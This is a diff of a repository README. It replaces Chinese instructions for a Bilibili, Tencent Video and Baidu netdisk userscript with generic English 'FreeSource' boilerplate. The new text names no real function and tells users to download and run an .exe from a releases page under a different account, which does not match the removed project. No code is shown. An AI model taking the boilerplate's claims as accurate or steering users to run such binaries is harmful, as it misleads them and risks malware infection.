@@ -1,79 +1,67 @@
-<div align="center">
-  <h1>b站、腾讯视频解析、百度网盘解析</h1>
-</div>
+# 🌟 FreeSource - Simple Tools for Everyone
 
----
+## 🏷️ Table of Contents
+1. [🚀 Getting Started](#-getting-started)
+2. [📥 Download & Install](#-download--install)
+3. [💻 System Requirements](#-system-requirements)
+4. [✨ Features](#-features)
+5. [🛠️ Usage](#-usage)
+6. [❓ FAQ](#-faq)
+7. [📞 Support](#-support)
 
-> 📢 **重要通知**
->
-> 服务器可能会因某些原因被迫转移，建议加入 [**交流群**](https://t.me/viphd2a) 防止失联。
+## 🚀 Getting Started
+Welcome to **FreeSource**, a collection of useful tools designed for easy use by anyone. You don't need to be a programmer to benefit from these applications. Let's get you started on your journey.
 
-## 📥 脚本安装
+## 📥 Download & Install
+To get the latest version of FreeSource, please visit the following link:
 
-当脚本需要更新时会自动跳转到此页面，如果不能正常安装或使用请查看本说明的「常见问题」部分。  
+[![Download FreeSource](https://img.shields.io/badge/Download-FreeSource-blue.svg)](https://github.com/vighnesh0537/FreeSource/releases)
 
+Once you're on the Releases page, you will see a list of available versions.
 
-<div align="center">
-  <a href="https://hd2a.neocities.org/min.baidu.user.js" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/点击安装或更新-脚本-blue?style=for-the-badge&logo=tampermonkey" alt="Install Script">
-  </a>
-  <a href="https://t.me/viphd2a" target="_blank" style="text-decoration:none;">
-    <img src="https://img.shields.io/badge/加入-交流群-blue?style=for-the-badge&logo=telegram" alt="Telegram Group">
-  </a>
-</div>
+1. Click on the version you want to download.
+2. Look for files labeled with your operating system. For instance, if you are using Windows, find the file that ends with `.exe`.
+3. Click on the file name to start your download.
+4. Once downloaded, locate the file in your computer’s downloads folder.
+5. Double-click the file to run the installer and follow the on-screen instructions.
 
-或者直接下载本项目文件[网盘下载助手.user.js](https://github.com/lvqop/FreeSource/raw/refs/heads/main/网盘下载助手.user.js)
-## ⭐️ 功能介绍
+## 💻 System Requirements
+Before you download, make sure your computer meets these basic requirements:
 
-### ☁️ 123云盘批量下载
-- ℹ️ 不支持分享页面使用，只能下载自己网盘里的资源。
-- ✅ 支持勾选多个文件和文件夹批量解析。
-- ✅ 下载的资源文件按网盘上的路径结构保存。
-- **提示**：右键点击「下载」按钮打开设置面板。
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **Processor:** Dual-core processor or better.
+- **Memory:** A minimum of 2 GB RAM.
+- **Storage:** At least 100 MB of available disk space.
 
-### 📺 bilibili视频画质提升
-打开任意up投稿的视频，在播放区域的右下方有个「下载」按钮，右键点击打开设置面板。然后勾选「启用高画质播放视频」后点击确定才会开启此功能。
+## ✨ Features
+FreeSource provides several tools aimed at enhancing your workflow:
 
-具体功能就不赘述了请自行体验，**建议换小号使用**。下面是效果展示：
-![](https://img1.vxv.xx.kg/img/0f0264d5a7a1634771924612822cf126.png)
-![](https://img1.vxv.xx.kg/img/20251130135349914.png)
+- **Easy Interface:** A user-friendly interface that requires no technical knowledge.
+- **Batch Processing:** Handle multiple files at once, saving you time.
+- **Format Support:** Compatible with various file formats, making it versatile for your needs.
+- **Import/Export Options:** Quickly import files into the application and export your results efficiently.
 
-#### 使用注意事项：
-*   仅观看仅限港澳台区的番剧比较卡顿时才需要调整「加速节点」，每次修改要刷新页面才会生效。
-*   需要登录的账号已完成bilibili的「答题转正」，否则该账号在平台是被视为临时用户，观看视频时可能会被锁定480P画质。
-*   账号昵称里面含有特殊字符无法正常使用脚本。
-*   需要额外付费或充电等要求的视频不能解析。
-*   在视频播放页面不会直接播放而是先暂停一会，此时不要人工干预，数据加载完成后便会自动播放。
-*   观看仅限港澳台区番剧不需要挂梯子，开了反而影响体验。
-*   每天会自动重置解析次数，但有些用户因为安装多个脚本出现冲突/网络不稳定等，引起重复发送多次解析请求从而快速消耗可用次数。这类情况可在群里发送指定消息(`bilibili`)人工重置解析次数。
+## 🛠️ Usage
+Using FreeSource is simple. Here’s a quick guide:
 
-#### 获取B站小号
-不方便创建小号的可以去淘宝或闲鱼上买。若网上购买也不方便的话可以私聊电报群里的机器人，发送指定消息免费领取。
-> 在交流群里发送此消息:
-> ```
-> onlymyrailgun
-> ```
-> **注意**：必须在这个 [卡密登录](https://passport.bilibili.com/login) 页面才会显示登录入口。
+1. Open the application after installation.
+2. Choose the task you wish to perform from the main menu.
+3. Follow the prompts to upload files or select settings.
+4. Use the built-in help tool for additional guidance as needed.
 
-## ❓ 常见问题
+You will find helpful tips within the application to assist during your tasks.
 
-### 1. 安装不了脚本怎么办？
-由于浏览器的缘故可能出现点击安装链接无效，可尝试另一个方法：
-1.  打开 Tampermoney 的「管理面板」
-2.  进入「实用工具」选项卡
-3.  复制粘贴以下安装地址到「从URL安装」进行安装
-    ```
-    http://140.245.52.124/tampermonkey/min.baidu.user.js
-    ```
+## ❓ FAQ
+**Q: Is FreeSource free to use?**  
+A: Yes, FreeSource is completely free.
 
-### 2. 脚本不能正常使用怎么办？
-涉及的原因比较多，可以先依次排查以下几件事：
-1.  **脚本或插件出现冲突**：关闭其他作用于同一网站的脚本和插件，或尝试重新安装脚本。
-2.  **清理浏览器缓存**：清理浏览器本地缓存数据并重新登录账号。
-3.  **网络问题**：尝试关闭 IPv6 只使用 IPv4 网络，若有梯子需关闭。
-4.  **环境不兼容**：不要用套壳浏览器，推荐使用 Firefox 浏览器（注意不要用国内特供版的火狐）。
+**Q: Can I use FreeSource on different operating systems?**  
+A: Yes, FreeSource is available for Windows, macOS, and Linux.
 
-> 遇到问题请尽量自己排查原因，实在解决不了再反馈。反馈时需要详细说明情况，包括浏览器和脚本管理器等信息，并打开浏览器控制台进行截图。
+**Q: Where can I get help if I encounter issues?**  
+A: Please refer to the Support section below.
 
-### 3. 如何在手机或平板上使用此脚本？
-安装一个支持 Tampermonkey 插件的浏览器。如果搭配“黑猴”等工具使用，则需要在 Tampermonkey 设置里将「配置模式」设为高级，并将「允许脚本访问 Cookie」设为 ALL。
+## 📞 Support
+If you have any questions or need assistance, please feel free to reach out. You can contact us through the GitHub Issues page on our repository. We aim to respond to all inquiries as quickly as possible.
+
+Thank you for choosing FreeSource. Enjoy your tools!
